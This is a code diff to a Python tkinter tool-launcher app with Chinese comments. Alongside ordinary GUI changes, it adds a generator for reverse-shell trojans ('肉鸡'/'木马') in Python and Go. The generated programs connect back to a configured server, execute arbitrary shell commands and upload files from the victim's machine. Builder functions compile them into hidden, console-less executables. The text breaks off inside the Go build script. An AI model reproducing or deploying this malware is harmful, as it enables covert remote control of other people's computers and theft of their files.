@@ -1,12 +1,14 @@
 import shutil
+import tempfile
 import urllib.request
 import urllib.parse
 import json
 import os
 import subprocess
 import urllib
-from tkinter import Button, Frame, LEFT, Menu, messagebox, simpledialog, filedialog
+from tkinter import Button, Frame, LEFT, Menu, messagebox, simpledialog, filedialog, Toplevel, Label
 from urllib.parse import urlparse
+from encryption import *
 
 ### 一、创建全局变量
 # 1、保存按钮信息
@@ -33,6 +35,15 @@ config_server_json_path = "config/server_config.json"
 # 8、启动窗口大小配置文件
 windowSize_json_path = "config/windowSize.json"
 
+# 9、AI对话模型的历史
+global_history = []
+
+# 10、临时文本的最新行号
+last_line_count = 1
+
+# 11、肉鸡面板是否获取信息
+rouji_json_xinxi_get = True
+
 ### 二、拿到用户电脑的屏幕尺寸
 def center_window(win, width, height):
     # 获取屏幕的尺寸
@@ -56,15 +67,23 @@ def on_right_click(frame_canvas,button,tool):
     # 定义菜单项和对应的操作
     context_menu = Menu(button, tearoff=0)
     context_menu.add_command(label="加入首页", command=lambda: join_index(tool))
+    context_menu.add_command(label="移除首页", command=lambda: remove_index(tool))
+    context_menu.add_separator()
     context_menu.add_command(label="打开所在文件夹", command=lambda: open_tools_path(frame_canvas,tool))
     context_menu.add_separator()
     context_menu.add_command(label="修改工具名称", command=lambda: edit_tools_name(frame_canvas,tool))
     context_menu.add_command(label="修改工具路径", command=lambda: edit_tools_path(frame_canvas,tool))
+    context_menu.add_command(label="修改运行方式", command=lambda: edit_tools_run(frame_canvas,tool))
     context_menu.add_command(label="修改启动命令", command=lambda: edit_tools_command(frame_canvas,tool))
+    context_menu.add_separator()
+    context_menu.add_command(label="工具前移", command=lambda: left_move_tools(frame_canvas,tool))
+    context_menu.add_command(label="工具后移", command=lambda: right_move_tools(frame_canvas,tool))
     context_menu.add_separator()
     context_menu.add_command(label="删除工具", command=lambda: delete_tools(frame_canvas,tool))
     context_menu.add_separator()
     context_menu.add_command(label="刷新", command=lambda: reload_tools(frame_canvas,tool))
+    context_menu.add_separator()
+    context_menu.add_command(label="属性", command=lambda: show_tools_properties(tool))
 
     # 绑定右键事件
     button.bind("<Button-3>", show_context_menu)
@@ -89,6 +108,22 @@ def join_index(tool_one):
     else:
         messagebox.showinfo("设置失败！", "该工具已经被设置在首页！")
 
+# 3、实现右键移除首页
+def remove_index(tool_one):
+    index = tool_one["index"]
+    tool_categorie = tool_one["工具分类"]
+    if index == 1:
+        tools = get_tools(tool_categorie)
+        for tool in tools:
+            if tool["工具名称"] == tool_one["工具名称"]:
+                tool["index"] = 0
+                break
+        update_tools(tool_categorie,tools)
+        # 提示写入成功
+        messagebox.showinfo("设置成功！", "该工具成功被移出首页！")
+    else:
+        messagebox.showinfo("设置失败！", "该工具已经被移出首页！")
+
 # 4、创建按钮、刷新按钮。从 TXT 加载工具信息并创建按钮的函数（刷新操作）
 def load_tools_and_create_buttons(frame_canvas,tool_categorie,tool_use="首页"):   # 这里的canvas实质是按钮的frame
     global buttons
@@ -111,7 +146,11 @@ def load_tools_and_create_buttons(frame_canvas,tool_categorie,tool_use="首页")
         if tool["启动方式"] == "下载链接":
             button = Button(frame_canvas, text=tool["工具名称"], command=lambda tool=tool: create_command_function(tool), padx=20, pady=10, fg="blue")
         else:
-            button = Button(frame_canvas, text=tool["工具名称"], command=lambda tool=tool: create_command_function(tool), padx=20, pady=10)
+            # 判断工具路径是否存在
+            if is_tool_path_active(tool):
+                button = Button(frame_canvas, text=tool["工具名称"], command=lambda tool=tool: create_command_function(tool), padx=20, pady=10)
+            else:
+                button = Button(frame_canvas, text=tool["工具名称"], command=lambda tool=tool: create_command_function(tool), padx=20, pady=10, state="disabled", bg="lightgray", fg="gray")         # 设置文字颜色为灰色
         # 给按钮添加右键功能
         on_right_click(frame_canvas,button,tool)
         # 使用 grid 布局管理器在主窗口中放置按钮
@@ -182,7 +221,7 @@ def create_command_function(tool):
                 messagebox.showinfo("直接启动失败","请右键修改启动命令！")
         elif tool_run_type == run_type[3]:      # 链接打开
             try:
-                subprocess.Popen(f"start msedge {tool_path}")
+                subprocess.Popen(f"start msedge {tool_path} & exit", shell=True)
             except Exception as e:
                 command_to_execute = f'start msedge {tool_path}'
                 # print(command_to_execute)
@@ -273,7 +312,6 @@ def edit_tools_command(frame_canvas,tool):
         # 进入刷新函数
         load_tools_and_create_buttons(frame_canvas,tool["工具分类"],tool["工具使用"])
 
-
 # 8、删除工具
 def delete_tools(frame_canvas,tool):
     txt_all = get_json_txt_all(get_menu_path_one(tool["工具分类"]))
@@ -320,6 +358,104 @@ def open_tools_path(frame_canvas,tool):
         subprocess.Popen(f'explorer "{tool_path}"')
     else:
         subprocess.Popen(['xdg-open', tool_path])   # linux打开文件夹
+
+# 11、工具前移、工具左移
+def left_move_tools(frame_canvas,tool):
+    # 获取当前工具所属的txt文件
+    txt_jsons = get_json_txt_all(get_menu_path_one(tool["工具分类"]))
+    # 循环遍历下标进行替换
+    for i in range(len(txt_jsons)):
+        if txt_jsons[i]["工具名称"] == tool["工具名称"]:
+            if i == 0:
+                messagebox.showinfo("警告！","该工具已经位于最前侧，不可移动")
+            else:
+                txt_jsons[i-1],txt_jsons[i] = txt_jsons[i],txt_jsons[i-1]
+    # 进行 txt 配置文件的保存
+    update_tools(tool["工具分类"],txt_jsons)
+    # 进入刷新函数
+    load_tools_and_create_buttons(frame_canvas,tool["工具分类"],tool["工具使用"])
+
+# 12、工具后移、工具右移
+def right_move_tools(frame_canvas,tool):
+    # 获取当前工具所属的txt文件
+    txt_jsons = get_json_txt_all(get_menu_path_one(tool["工具分类"]))
+    # 循环遍历下标进行替换
+    for i in range(len(txt_jsons)):
+        if txt_jsons[i]["工具名称"] == tool["工具名称"]:
+            if i == len(txt_jsons)-1:
+                messagebox.showinfo("警告！","该工具已经位于最后侧，不可移动")
+            else:
+                txt_jsons[i+1],txt_jsons[i] = txt_jsons[i],txt_jsons[i+1]
+            break
+    # 进行 txt 配置文件的保存
+    update_tools(tool["工具分类"],txt_jsons)
+    # 进入刷新函数
+    load_tools_and_create_buttons(frame_canvas,tool["工具分类"],tool["工具使用"])
+
+# 13、修改工具启动方式
+def edit_tools_run(frame_canvas,tool):
+    import tkinter as tk
+    from tkinter import ttk
+    root = tk.Tk()
+    root.title("修改启动方式")
+    screen_width = root.winfo_screenwidth()
+    screen_height = root.winfo_screenheight()
+    position_top = int(screen_height / 2 - 75)  # 假设默认高度为150的一半
+    position_right = int(screen_width / 2 - 150)  # 假设默认宽度为300的一半
+    root.geometry(f"+{position_right}+{position_top}")
+    run_type_label = ttk.Label(root, text="启动方式:")
+    run_type_label.grid(row=0, column=0, padx=(0, 10), sticky='e')
+    tool_run_type = ttk.Combobox(root, values=["直接打开","命令行打开","文件夹打开","链接打开","下载链接"], state="readonly")
+    tool_run_type.current(0)  # 设置当前选中项为第一个
+    tool_run_type.grid(row=0, column=1, padx=(0, 10), sticky='we')  # 将下拉框放置在网格中
+    def save_button():
+        print(tool_run_type.get())  # 获取下拉框的当前值
+        # 获取工具的json信息
+        tool_json = get_json_txt_all(get_menu_path_one(tool["工具分类"]))
+        # 循环遍历下标进行替换
+        for i in range(len(tool_json)):
+            if tool_json[i]["工具名称"] == tool["工具名称"]:
+                tool_json[i]["启动方式"] = tool_run_type.get()
+                break
+        # 销毁root
+        root.destroy()
+        # 进行 txt 配置文件的保存
+        update_tools(tool["工具分类"],tool_json)
+        # 进入刷新函数
+        load_tools_and_create_buttons(frame_canvas,tool["工具分类"],tool["工具使用"])
+    save_btn = ttk.Button(root, text="保存", command=save_button)
+    save_btn.grid(row=1, column=0, columnspan=2, pady=10)
+    root.mainloop()
+
+# 14、判断工具路径是否存在
+def is_tool_path_active(tool):
+    # 1、判断工具类型
+    if is_path(tool) == 2:   # 相对路径
+        # 进行路径拼接
+        tool_path = get_os_path() + "\\" + get_menu_path_one(tool["工具分类"]) + "\\" + tool["工具路径"]
+    elif is_path(tool) == 1:   # 绝对路径
+        tool_path = tool["工具路径"]
+    else:
+        return True
+
+    if os.path.exists(tool_path):
+        return True
+    else:
+        return False
+
+# 15、查看工具属性
+def show_tools_properties(tool):
+    # 获取当前工具所属的txt文件
+    txt_jsons = get_json_txt_all(get_menu_path_one(tool["工具分类"]))
+    # 循环遍历下标进行替换
+    tool_properties = {}
+    for i in range(len(txt_jsons)):
+        if txt_jsons[i]["工具名称"] == tool["工具名称"]:
+            tool_properties = txt_jsons[i]
+    tool_propertie_content = ""
+    for key in tool_properties.keys():
+        tool_propertie_content += f"{key}：{tool_properties[key]}\n"
+    messagebox.showinfo("工具属性",tool_propertie_content)
 
 ### 四、有关导航栏的操作
 # 1、创建导航栏
@@ -579,23 +715,32 @@ def config_ai_json_null_check():
     global config_ai_json
     config_ai_json = get_ai_json_all()
     try:
-        if len(config_ai_json) == 0 or get_ai_json_one_api(get_ai_json_name_all()[0]) == "":
-            return False
-        else:
-            return True
+        for ai_name in config_ai_json.keys():
+            if config_ai_json[ai_name]["AI_API"] != "":
+                return True
+        return False
     except Exception as e:
         return False
 
-# 3、获取 json 文件中所有的 menu 名字，返回的是数组
+# 3、获取 json 文件中所有的 AI 名字，返回的是数组
 def get_ai_json_name_all():
-    return list(config_ai_json.keys())
+    ai_keys_lists = list(config_ai_json.keys())
+    return ai_keys_lists
 
 # 4、修改更新ai的json配置文件
-def update_ai_json(ai_names,ai_api):
+def update_ai_json(ai_names, ai_api, page_nums, ai_names_two):
+    if page_nums == 2:
+        config_ai_json[ai_names_two]["use_page"] = page_nums
+
+    config_ai_json[ai_names]["AI_API"] = ai_api.strip()
+    config_ai_json[ai_names]["use_page"] = page_nums
+
+    # 给非这两个ai的user_page设置成0
     for ai_name in get_ai_json_name_all():
-        if ai_name == ai_names:
-            config_ai_json[ai_names]["AI_API"] = ai_api.strip()
-            # config_ai_json[ai_names]["ai_color"] = ai_color
+        if ai_name != ai_names and ai_name != ai_names_two:
+            config_ai_json[ai_name]["use_page"] = 0
+    # 更新json文件
+
     update_ai_all_json(config_ai_json)
 
 # 5、全更改ai的json配置文件
@@ -606,10 +751,35 @@ def update_ai_all_json(json_info):
 
 # 6、创建ai的json文件
 def create_ai_json():
+    # use_page 表示了两个设置
+    # 1、use表示是否启用这个AI
+    # 2、page表示设置多少分栏，目前仅支持2个分栏
+    # 3、use_page 的值分别有：False、1、2
     ai_info = {
         "kimi_ai":{
-            "AI_API"  :   "",
-            "ai_color"    :   "",
+            "AI_API"    :   "",
+            "ai_color"  :   "",
+            "use_page"      :   0
+        },
+        "通义千问":{
+            "AI_API"    :   "",
+            "ai_color"  :   "",
+            "use_page"      :   0
+        },
+        "智谱清言":{
+            "AI_API"    :   "",
+            "ai_color"  :   "",
+            "use_page"      :   0
+        },
+        "deepseek_api":{
+            "AI_API"    :   "",
+            "ai_color"  :   "",
+            "use_page"      :   0
+        },
+        "ollama":{
+            "AI_API"    :   "",
+            "ai_color"  :   "",
+            "use_page"      :   0
         }
     }
     update_ai_all_json(ai_info)
@@ -623,6 +793,35 @@ def get_ai_json_one_api(ai_name):
 # 8、获取某一个ai的color
 def get_ai_json_one_color(ai_name):
     return config_ai_json[ai_name]["ai_color"]
+
+# 9、获取当前use为True 的AI名称
+def get_ai_json_use_True_name():
+    try:
+        for ai_names in get_ai_json_name_all():
+            # 判断谁的use 是True
+            if config_ai_json[ai_names]['use_page'] != 0:
+                return ai_names
+    except Exception:
+        print("由于对话模型配置变动，请删除config/ai_ask.json 重新配置API！")
+
+# 10、获取当前use为True 的两个AI的名称
+def get_ai_json_use_True_name_two():
+    try:
+        ai_use_True_twon_names = []
+        for ai_names in get_ai_json_name_all():
+            # 判断谁的use 是True
+            if config_ai_json[ai_names]['use_page'] == 2:
+                ai_use_True_twon_names.append(ai_names)
+        return ai_use_True_twon_names
+    except Exception:
+        print("由于对话模型配置变动，请删除config/ai_ask.json 重新配置API！")
+
+# 11、获取当前分栏的数量
+def get_ai_json_use_page():
+    try:
+        return config_ai_json[get_ai_json_use_True_name()]['use_page']
+    except Exception:
+        return 0
 
 ### 八、启动窗口大小配置
 # 1、保存启动窗口大小配置
@@ -665,8 +864,377 @@ def delete_server_json():
     if os.path.isfile(config_server_json_path):
         os.remove(config_server_json_path)
 
-# 5、增加木马，也就是生成木马操作
-def add_muma():
+# 5、增加对C端肉鸡的脚本输出
+def get_rouji_C(listen_IP, listen_Port, language):
+
+    if language == "python":
+        return f"""import socket
+import subprocess
+import select
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+import os
+import sys
+import base64
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:
+    client.connect(("{listen_IP}", {listen_Port}))
+except Exception:
+    client.close()
+    sys.exit(1)
+tunnel_sockets = {{}}
+transfer_state = {{
+    'in_transfer': False,
+    'file_handle': None,
+    'file_size': 0,
+    'sent_size': 0
+}}
+def aes_encrypt(plaintext: bytes, key: bytes) -> str:
+    iv = os.urandom(AES.block_size)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
+    result = base64.b64encode(iv + ciphertext).decode('utf-8')
+    return result
+def send_result(client_socket, result_bytes):
+    data_length = len(result_bytes)
+    length_prefix = aes_encrypt(str(data_length).encode('utf-8'), b'0123456789abcdef')
+    client_socket.send(length_prefix.encode('utf-8'))
+    client_socket.send(result_bytes)
+def send_file_nonblocking(local_file):
+    global transfer_state
+    try:
+        file_size = os.path.getsize(local_file)
+        chunk_size = 8192
+        client.sendall(str(file_size).encode("UTF-8"))
+        ready, _, _ = select.select([client], [], [], 10.0)
+        if not ready:
+            return False, "服务器确认超时"
+        ready = client.recv(1024).decode("UTF-8").strip()
+        if ready != "READY":
+            return False, f"服务器未准备好: {{ready}}"
+        with open(local_file, 'rb') as f:
+            sent_size = 0
+            while sent_size < file_size:
+                remaining = file_size - sent_size
+                recv_size = min(chunk_size, remaining)
+                chunk = f.read(recv_size)
+                if not chunk:
+                    break
+                _, writable, _ = select.select([], [client], [], 5.0)
+                if writable:
+                    try:
+                        client.sendall(chunk)
+                        sent_size += len(chunk)
+                    except socket.error as e:
+                        return False, f"发送失败: {{e}}"
+                else:
+                    return False, "发送超时"
+        return True, None
+    except Exception as e:
+        return False, str(e)
+while True:
+    try:
+        readable, _, _ = select.select([client], [], [], 0.1)
+        if not readable:
+            continue
+        response = client.recv(1024).decode('utf-8')
+
+        if transfer_state['in_transfer']:
+            continue
+        if "exit" == response:
+            break
+        elif "cd" in response and response.startswith("cd "):
+            os.chdir(response[3:].strip())
+            result = "执行成功，结果为空".encode("UTF-8")
+        elif "pwd" in response:
+            result = os.getcwd().encode("UTF-8")
+        elif "get_Process" in response:
+            result = os.path.basename(__file__).encode("UTF-8")
+        elif "start" in response and response.startswith("start "):
+            subprocess.Popen(response, shell=True,
+                             stdout=subprocess.PIPE,
+                             stderr=subprocess.PIPE)
+            result = "执行成功，结果为空".encode("UTF-8")
+        elif "get" in response and response.startswith("get "):
+            try:
+                parts = response.split(maxsplit=1)
+                if len(parts) >= 2:
+                    local_file = parts[1]
+                    if os.path.exists(local_file):
+                        transfer_state['in_transfer'] = True
+                        success, error = send_file_nonblocking(local_file)
+                        transfer_state['in_transfer'] = False
+                        if success:
+                            result = b''
+                        else:
+                            result = f"文件传输失败: {{error}}".encode("UTF-8")
+                    else:
+                        result = f"文件不存在: {{local_file}}".encode("UTF-8")
+                else:
+                    result = "命令格式错误，请使用: get <local_file>".encode("UTF-8")
+            except Exception as e:
+                transfer_state['in_transfer'] = False
+                result = f"文件上传异常: {{str(e)}}".encode("UTF-8")
+        else:
+            result = subprocess.check_output(response,stderr=subprocess.STDOUT,shell=True)
+        if result == b'':
+            if "get" not in response:
+                send_result(client, "执行成功，结果为空".encode("UTF-8"))
+        else:
+            send_result(client, result)
+    except Exception as e:
+        transfer_state['in_transfer'] = False
+        send_result(client, "错误的命令输入！".encode("UTF-8"))
+try:
+    client.close()
+except:
+    pass
+finally:
+    sys.exit(0)"""
+    elif language == "go":
+        return f"""package main
+import (
+	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
+	"encoding/base64"
+	"fmt"
+	"io"
+	"net"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"strconv"
+	"strings"
+	"time"
+)
+var (
+	tunnelSockets = make(map[net.Conn]bool)
+	transferState = struct {{
+		inTransfer  bool
+		fileHandle  *os.File
+		fileSize    int64
+		sentSize    int64
+	}}{{
+		inTransfer: false,
+	}}
+)
+func pkcs7Pad(data []byte, blockSize int) []byte {{
+	padding := blockSize - len(data)%blockSize
+	padText := bytes.Repeat([]byte{{byte(padding)}}, padding)
+	return append(data, padText...)
+}}
+
+func aesEncrypt(plaintext []byte, key []byte) (string, error) {{
+	block, err := aes.NewCipher(key)
+	if err != nil {{
+		return "", err
+	}}
+	iv := make([]byte, aes.BlockSize)
+	for i := range iv {{
+		iv[i] = byte(i)
+	}}
+	paddedData := pkcs7Pad(plaintext, aes.BlockSize)
+	ciphertext := make([]byte, len(paddedData))
+	mode := cipher.NewCBCEncrypter(block, iv)
+	mode.CryptBlocks(ciphertext, paddedData)
+
+	result := append(iv, ciphertext...)
+	return base64.StdEncoding.EncodeToString(result), nil
+}}
+func sendResult(clientSocket net.Conn, result []byte) error {{
+	dataLength := len(result)
+	lengthPrefix, err := aesEncrypt([]byte(strconv.Itoa(dataLength)), []byte("0123456789abcdef"))
+	if err != nil {{
+		return err
+	}}
+
+	_, err = clientSocket.Write([]byte(lengthPrefix))
+	if err != nil {{
+		return err
+	}}
+
+	_, err = clientSocket.Write(result)
+	return err
+}}
+
+func sendFileNonblocking(client net.Conn, localFile string) (bool, string) {{
+	fileInfo, err := os.Stat(localFile)
+	if err != nil {{
+		return false, fmt.Sprintf("文件不存在: %s", localFile)
+	}}
+
+	fileSize := fileInfo.Size()
+	chunkSize := 8192
+
+	client.Write([]byte(strconv.FormatInt(fileSize, 10)))
+
+	client.SetReadDeadline(time.Now().Add(10 * time.Second))
+	buffer := make([]byte, 1024)
+	n, err := client.Read(buffer)
+	if err != nil {{
+		return false, "服务器确认超时"
+	}}
+
+	ready := strings.TrimSpace(string(buffer[:n]))
+	if ready != "READY" {{
+		return false, fmt.Sprintf("服务器未准备好: %s", ready)
+	}}
+
+	client.SetReadDeadline(time.Time{{}})
+
+	file, err := os.Open(localFile)
+	if err != nil {{
+		return false, fmt.Sprintf("无法打开文件: %v", err)
+	}}
+	defer file.Close()
+
+	sentSize := int64(0)
+	sendBuffer := make([]byte, chunkSize)
+
+	for sentSize < fileSize {{
+		remaining := fileSize - sentSize
+		readSize := int64(chunkSize)
+		if remaining < readSize {{
+			readSize = remaining
+		}}
+		n, err := file.Read(sendBuffer[:readSize])
+		if err != nil && err != io.EOF {{
+			return false, fmt.Sprintf("读取文件失败: %v", err)
+		}}
+
+		if n == 0 {{
+			break
+		}}
+
+		client.SetWriteDeadline(time.Now().Add(5 * time.Second))
+		written, err := client.Write(sendBuffer[:n])
+		if err != nil {{
+			return false, fmt.Sprintf("发送失败: %v", err)
+		}}
+
+		client.SetWriteDeadline(time.Time{{}})
+		sentSize += int64(written)
+	}}
+
+	return true, ""
+}}
+func executeCommand(cmdStr string) ([]byte, error) {{
+	parts := strings.Fields(cmdStr)
+	if len(parts) == 0 {{
+		return nil, fmt.Errorf("空命令")
+	}}
+	var cmd *exec.Cmd
+	if len(parts) > 1 {{
+		cmd = exec.Command(parts[0], parts[1:]...)
+	}} else {{
+		cmd = exec.Command(parts[0])
+	}}
+	cmd = exec.Command(cmdStr)
+	output, err := cmd.CombinedOutput()
+	if err != nil {{
+	    cmd = exec.Command("cmd", "/c", cmdStr)
+	    output, err = cmd.CombinedOutput()
+        return output, err
+    }}
+	return output, err
+}}
+func main() {{
+	conn, err := net.Dial("tcp", "{listen_IP}:{listen_Port}")
+	if err != nil {{
+		fmt.Fprintf(os.Stderr, "连接失败: %v", err)
+		os.Exit(1)
+	}}
+	defer conn.Close()
+	fmt.Println("已连接到服务器")
+	buffer := make([]byte, 4096)
+
+	for {{
+		conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
+		n, err := conn.Read(buffer)
+
+		if err != nil {{
+			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {{
+				continue
+			}}
+			break
+		}}
+		conn.SetReadDeadline(time.Time{{}})
+		if transferState.inTransfer {{
+			continue
+		}}
+		response := strings.TrimSpace(string(buffer[:n]))
+		var result []byte
+		switch {{
+		case response == "exit":
+			return
+		case strings.HasPrefix(response, "cd "):
+			dir := strings.TrimSpace(response[3:])
+			err := os.Chdir(dir)
+			if err != nil {{
+				result = []byte(fmt.Sprintf("切换目录失败: %v", err))
+			}} else {{
+				result = []byte("执行成功，结果为空")
+			}}
+		case response == "pwd":
+			dir, err := os.Getwd()
+			if err != nil {{
+				result = []byte(fmt.Sprintf("获取当前目录失败: %v", err))
+			}} else {{
+				result = []byte(dir)
+			}}
+		case response == "get_Process":
+			result = []byte(filepath.Base(os.Args[0]))
+		case strings.HasPrefix(response, "start "):
+			cmd := strings.TrimSpace(response[6:])
+			parts := strings.Fields(cmd)
+			if len(parts) > 0 {{
+				exec.Command(parts[0], parts[1:]...).Start()
+			}}
+			result = []byte("执行成功，结果为空")
+		case strings.HasPrefix(response, "get "):
+			parts := strings.SplitN(response, " ", 2)
+			if len(parts) >= 2 {{
+				localFile := strings.TrimSpace(parts[1])
+				if _, err := os.Stat(localFile); err == nil {{
+					transferState.inTransfer = true
+					success, errMsg := sendFileNonblocking(conn, localFile)
+					transferState.inTransfer = false
+					if success {{
+						result = []byte{{}}
+					}} else {{
+						result = []byte(fmt.Sprintf("文件传输失败: %s", errMsg))
+					}}
+				}} else {{
+					result = []byte(fmt.Sprintf("文件不存在: %s", localFile))
+				}}
+			}} else {{
+				result = []byte("命令格式错误，请使用: get <文件路径>")
+			}}
+		default:
+			output, err := executeCommand(response)
+			if err != nil {{
+				result = []byte(fmt.Sprintf("命令执行失败: %v", err))
+			}} else if len(output) == 0 {{
+				result = []byte("执行成功，结果为空")
+			}} else {{
+				result = output
+			}}
+		}}
+		if len(result) > 0 || !strings.HasPrefix(response, "get ") {{
+			err := sendResult(conn, result)
+			if err != nil {{
+				fmt.Fprintf(os.Stderr, "发送结果失败: %v", err)
+				break
+			}}
+		}}
+	}}
+	fmt.Println("连接已关闭")
+}}
+"""
+
+# 5、增加py木马，也就是生成木马操作
+def add_py_muma():
     def create_and_save_text_file(content):
         # 弹出文件保存对话框，让用户选择保存位置和文件名
         filepath = filedialog.asksaveasfilename(
@@ -682,7 +1250,7 @@ def add_muma():
         # 写入内容到文件
         with open(filepath, 'w', encoding='utf-8') as file:
             file.write(content)
-        messagebox.showinfo("生成成功",f"文件已保存到: {filepath}\n1、可以对py木马进行装饰\n2、可以用pyinstaller -F -w xxx.py 打包变成exe")
+        messagebox.showinfo("生成成功",f"文件已保存到: {filepath}\n1、可以对py木马进行装饰\n\n3、打包为无窗口的后台运行：pyinstaller --onefile --noconsole -F --icon=NONE 1.py")
 
     if config_server_json_null_check():
         server_json = get_server_json()
@@ -693,27 +1261,276 @@ def add_muma():
         messagebox.showinfo("错误","请先进行服务端的连接！\n请将工具箱目录下的server.py文件运行在放在双方都可访问的服务器上\n并配置服务端连接")
         return
 
-    conntext = f"""import socket,subprocess,os
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect(("{listen_IP}", {listen_Port}))
-while True:
-    response = client.recv(4096).decode("UTF-8")
-    print(response)
-    if "exit" == response:
-        break
-    elif "cd" in response:
-        os.chdir(response[3:].strip())
-    try:
-        result = subprocess.check_output(response,stderr=subprocess.STDOUT, shell=True)
-        if result == b'':   # 创建文件等命令的返回值为空
-            client.send("执行成功，结果为空\\r\\n".encode("UTF-8"))
-        else:
-            client.send(result)
-    except:
-        client.send("错误的命令输入！\\r\\n".encode("UTF-8"))
-client.close()"""
+    conntext = get_rouji_C(listen_IP, listen_Port, "python")
 
     create_and_save_text_file(conntext)
+
+# 6、增加exe木马导出
+def add_py_exe_muma():
+    if config_server_json_null_check():
+        server_json = get_server_json()
+        listen_IP = server_json["server_ip"]
+        listen_Port = server_json["server_port"]
+    else:
+        print("错误: 请先进行服务端的连接")
+        return
+
+    py_data = get_rouji_C(listen_IP, listen_Port, "python")
+
+    filepath = filedialog.asksaveasfilename(
+        defaultextension=".exe",
+        filetypes=[("Executable Files", "*.exe"), ("All Files", "*.*")]
+    )
+
+    if not filepath:
+        print("文件保存被取消")
+        return
+
+    output_dir = os.path.dirname(filepath)
+    exe_name = os.path.splitext(os.path.basename(filepath))[0]
+    # console = messagebox.askyesno("控制台选项", "是否显示控制台窗口？")
+    console = True
+
+
+    try:
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as f:
+            f.write(py_data)
+            temp_py = f.name
+
+        # 创建更详细的批处理文件
+        bat_content = f'''@echo off
+title PyInstaller 编译工具 - {exe_name}
+color 0A
+
+echo.
+echo ╔══════════════════════════════════════════════════════════╗
+echo ║                  木马程序编译工具                        ║
+echo ╚══════════════════════════════════════════════════════════╝
+echo.
+echo [信息] 开始编译配置:
+echo.
+echo    源文件: {temp_py}
+echo    输出目录: {output_dir}
+echo    EXE名称: {exe_name}.exe
+echo    控制台: {"隐藏 (后台运行)" if not console else "显示 (调试模式)"}
+echo.
+echo [信息] 正在编译，请耐心等待...
+echo.
+
+set START_TIME=%time%
+
+pyinstaller --onefile --noconsole -F --icon=NONE --name="{exe_name}" --distpath="{output_dir}" "{temp_py}"
+
+set END_TIME=%time%
+
+echo.
+echo ╔══════════════════════════════════════════════════════════╗
+if exist "{output_dir}\\{exe_name}.exe" (
+    echo ║                      编译成功！                        ║
+    echo ╚══════════════════════════════════════════════════════════╝
+    echo.
+    echo [结果] EXE文件信息:
+    echo.
+    echo    位置: {output_dir}\\{exe_name}.exe
+    for %%F in ("{output_dir}\\{exe_name}.exe") do (
+        echo    大小: %%~zF 字节
+    )
+    echo    开始时间: %START_TIME%
+    echo    结束时间: %END_TIME%
+    echo.
+    echo [提示] 文件已生成，可以直接使用
+) else (
+    echo ║                      编译失败！                        ║
+    echo ╚══════════════════════════════════════════════════════════╝
+    echo.
+    echo [错误] 请检查上方错误信息
+    echo.
+    echo [建议] 常见问题:
+    echo    1. 是否已安装pyinstaller: pip install pyinstaller
+    echo    2. 是否以管理员权限运行
+    echo    3. 磁盘空间是否充足
+)
+echo.
+echo ╔══════════════════════════════════════════════════════════╗
+echo ║  按任意键关闭此窗口，或等待10秒后自动关闭...              ║
+echo ╚══════════════════════════════════════════════════════════╝
+echo.
+
+REM 等待10秒或按键
+timeout /t 10 /nobreak >nul 2>nul
+
+REM 清理临时文件
+del /f /q "{temp_py}" 2>nul
+rmdir /s /q "build" 2>nul
+del /f /q "{exe_name}.spec" 2>nul
+del /f /q "compile_{exe_name}.bat" 2>nul
+exit
+'''
+
+        # 保存批处理文件
+        bat_path = os.path.join(output_dir, f"compile_{exe_name}.bat")
+        with open(bat_path, 'w', encoding='gbk') as f:
+            f.write(bat_content)
+
+        # 弹出新的CMD窗口
+        subprocess.Popen(
+            f'start cmd /c "{bat_path}"',
+            shell=True
+        )
+
+    except Exception as e:
+        print(f"错误: {str(e)}")
+        messagebox.showerror("失败", f"错误: {str(e)}")
+
+# 7、生成Go木马
+def add_go_muma():
+    def create_and_save_text_file(content):
+        # 弹出文件保存对话框，让用户选择保存位置和文件名
+        filepath = filedialog.asksaveasfilename(
+            defaultextension=".go",
+            filetypes=[("Go Files", "*.go"), ("All Files", "*.*")]
+        )
+
+        # 如果用户取消了操作，filepath会是空字符串
+        if not filepath:
+            print("文件保存被取消。")
+            return
+
+        # 写入内容到文件
+        with open(filepath, 'w', encoding='utf-8') as file:
+            file.write(content)
+        messagebox.showinfo("生成成功",f"文件已保存到: {filepath}\n1、可以对go木马进行装饰\n\n3、打包为无窗口的后台运行：go build -ldflags=\"-H=windowsgui\" -o myprogram.exe main.go")
+
+    if config_server_json_null_check():
+        server_json = get_server_json()
+        listen_IP = server_json["server_ip"]
+        listen_Port = server_json["server_port"]
+
+    else:
+        messagebox.showinfo("错误","请先进行服务端的连接！\n请将工具箱目录下的server.py文件运行在放在双方都可访问的服务器上\n并配置服务端连接")
+        return
+
+    conntext = get_rouji_C(listen_IP, listen_Port, "go")
+
+    create_and_save_text_file(conntext)
+
+def add_go_exe_muma():
+    # import os
+    # import subprocess
+    # import tempfile
+    # from tkinter import filedialog, messagebox
+
+    # 检查服务端连接（假设有此函数）
+    if config_server_json_null_check():
+        server_json = get_server_json()
+        listen_IP = server_json["server_ip"]
+        listen_Port = server_json["server_port"]
+    else:
+        print("错误: 请先进行服务端的连接")
+        return
+
+    go_data = get_rouji_C(listen_IP, listen_Port, "go")
+
+    filepath = filedialog.asksaveasfilename(
+        defaultextension=".exe",
+        filetypes=[("Executable Files", "*.exe"), ("All Files", "*.*")]
+    )
+
+    if not filepath:
+        print("文件保存被取消")
+        return
+
+    output_dir = os.path.dirname(filepath)
+    exe_name = os.path.splitext(os.path.basename(filepath))[0]
+    console = True  # 控制台选项，可以根据需要修改
+
+    try:
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.go', delete=False, encoding='utf-8') as f:
+            f.write(go_data)
+            temp_go = f.name
+
+        # 创建更详细的批处理文件
+        bat_content = f'''@echo off
+title Go编译工具 - {exe_name}
+color 0A
+
+echo.
+echo ╔══════════════════════════════════════════════════════════╗
+echo ║                   Go 程序编译工具                      ║
+echo ╚══════════════════════════════════════════════════════════╝
+echo.
+echo [信息] 开始编译配置:
+echo.
+echo    源文件: {temp_go}
+echo    输出目录: {output_dir}
+echo    EXE名称: {exe_name}.exe
